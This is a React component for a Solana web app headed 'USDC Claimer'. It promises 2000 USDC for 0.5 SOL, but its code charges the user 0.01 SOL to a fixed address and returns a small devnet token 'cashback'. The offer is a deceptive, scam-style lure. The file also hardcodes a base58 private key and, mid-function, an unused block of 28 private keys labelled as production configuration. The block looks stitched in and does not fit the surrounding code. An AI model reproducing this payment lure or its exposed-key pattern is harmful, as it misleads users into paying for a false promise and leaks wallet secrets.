/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3ZzkPQZT6fkkQebY2k6vUDWy8Yjocjd6kENwux6XMTvKhWBa51HAhixnVUdNhc1h7iUFUdYNeoagqod63kRpuj5x"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2pz12Z3xPGdU2WXtQVT37e8e4h6JZMdMz5uphchE7SMC3HFooJMt2fd53s3TXhfpDKMrsdaHzCSzEx7odJNBtPh8",
  "key1": "4V1uTirjSo4rkbhJQWFuCkZczRditspYAkTpUbbdoUDAZA4xUFW3vHsqATrd7WkuNgVZtN1pTeCfEnRwktYVFNfx",
  "key2": "18K1iLG9jHzo4ufdDbm3xqcyanD4s3w29k9qjDjJqQn2zJS8U1ScrhJyLGJTAtwJhtv9tmJbiaxtVmEqTwDmFze",
  "key3": "5s1gfpMkKwjndeMic3uoEmbfgcNU9nYMMdPCbKFfPzaVX8JFBnu2hmbEVupCapp8B3ULXcX6YPaoZvw5h24HroH8",
  "key4": "YMhRiR68iTmDWEBbUzWkr7wEQnLm9v3D4BwGdhBTnqJ7dnc5N3qskyunmdpQKTeVgFmbusSFZatr1kFztcg6cZ7",
  "key5": "3UEErcmEDQyuRjrBCnhgexCau8rm7WcXXtzWedKZ42Q4h5uHSF99XxMp27NkMwjZ2wSGQvKoe8umFG9gaaozjhfd",
  "key6": "4MZYxSzXQ8oWHYpHXNA3MW18CjXxxpsa5EEj9hTZjeot2hRq8W2DFvoqLaP4NxZRKL5QWRP5ZdXDcfwjzKqcYyLJ",
  "key7": "62Vo4ZzEH29YJXrAcuu9k6y4J9R5x8DJ3957hTcJHMcJ7vmjHeVBMoArNptZhc45psqADPf1huNYbXTcdYBwNGgW",
  "key8": "3bKcn3edPkM1FjxUD23sbZSKpTe7Pip1pX5tjAarMTr2LGjCUGKXewe7v2crp1QMRp6mXoUkBXEXijhNUZQNm9cR",
  "key9": "2T2Kr3n5rnvENmHPPkFc4mCQUHko7MMRZerbwisH2DxqmLasmAwmvf99a1kzNPnNTcimZA1hZH5XKEjhr8NrQDR",
  "key10": "3sLvA7fpMjzjgD4w7TQZPQL2DEyda8K5PVSgo32RsdvrmwT86hv1ZjRR6VzPfLQWsBpzSxBHg3LPmF5u8bpjqNCK",
  "key11": "4yxnM5nsu3HZgHLh9Cm9UFobCRoR6S5NKKJEj97ggf55anEVTJjR2QNup4jJ8GzjHoxtRkV6FtZQp4UkbS7cphZp",
  "key12": "4HzbFYFpVLAE2NPfknvkxUuFarwftn2AFPw3EGm7j2SHizkZgScUxnNJWQa39R5dFYuiUqmNXSoYAg4DbLgYp4XL",
  "key13": "2Wbu64ijUjggazsE1XVqU7SPf9bs4r22fwTkDKaMRQ7ZhVdmRBYH3CrcwWAB62NFfj9p5ozdAjGPnhQ1bkKRVBaH",
  "key14": "2bzyWCHYvKVpJVXn7ZFz4fpDKRtVJLvtHpUFDZoKUaQDnFxxpS49XCgmmUBN5xo6P1yzQKLoMcureQGmrcHWx2cY",
  "key15": "4JFvcTw5DfVLavxCSaPnSkVFjNT59nnhS9wtFet19Bds8Tv4yFoD4hDrKNHGhEq5wnQTaBWRw7TYX3AFjoEBHBbG",
  "key16": "oWZh34eWjjyENa7TKAvfKaTkFksSt8zBZLbsLg5KWQkHqjkpJ2oQMDkzL3dDJWJ4qN9U9pYBMMXquTykcXbGvSD",
  "key17": "2Lsr49oe5MWfjnXbD19aAq3w7Pr5XQEMDE83qr2p5WQqgCJD272WjHbPv7ryApa4oPzeYG3Zm9zYBLH42SPejxKm",
  "key18": "39bhvbFzxe4PkJfioS9bsva3HnCA9pAtFkjim2fjE5Nzydow6XqtfTPbwC98uCTcLsfZ5LtNsHQvBxQGVdWBaysG",
  "key19": "31kV8bxxEJDNXGvALy4AeKVZBRpw12QmfoLc8yeX4sDH3YBJUZq3DByXKHdRqM8sxDFosKtsVifFjbTXiyJRvNuD",
  "key20": "kSFBMjYePqPaNaFRPBWChzBjDW1EXipiyu9GmAW7vnEgv1F5pF4y5qh3FDdtzkAMiutxuftfftX6N3qVas2uinn",
  "key21": "3vx2BVFqyNZdFsAoQswpfAdp1hC8UNYnYGqBv5XTHvBLSd5Sw7rSWBwgiR8axBbkXi1ZzLoenM9f8otUutZEsDxi",
  "key22": "2sX9HHwqcTZVyr41UTf1eboupnrgp5LVyzDbwiFRsLCrSwB9FJCbTjgFzGqF7ERBByC48vkMrpmhRMrAV11QVhCx",
  "key23": "4R3E5GRVYty5RiXyv3su2n7R1xbjoZd9D74m4RwXmZucxZg5X89Ph5Lu72TBib2zuE9jYArJVaXKEt2owzckwLHR",
  "key24": "4ZRruZFJUFUychwfSEMjVwZFtthBYrzvnbs6CEeMzHxj19gWWHFKbvgpGMCczuR2cgqcPGvuNJZfixDTYz13biJ2",
  "key25": "49oiZUV7XrDHmd1rnkaM4GFuZnMwfpkHB3Gh2Zx8p3deJoXa96KA8teQkz7mj7xQwmzDUPUQXoP9o3zu5hCnYF68",
  "key26": "4nTcu97sQr4oedkPfogqindFHUWTjz18bu3xjkhKieCG62AWVKzqA7TA9xEN1oHQY5esu1JcMQ7ygW5S49x6ecDV",
  "key27": "2mKvXs5nV6GSUunaFFbDRvfPvF2vtgxcegmbNB39v9hYiPvU6qhW4A1pQQvwLnGmqqxskapTvJn4fUcEcVTyKkNS"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
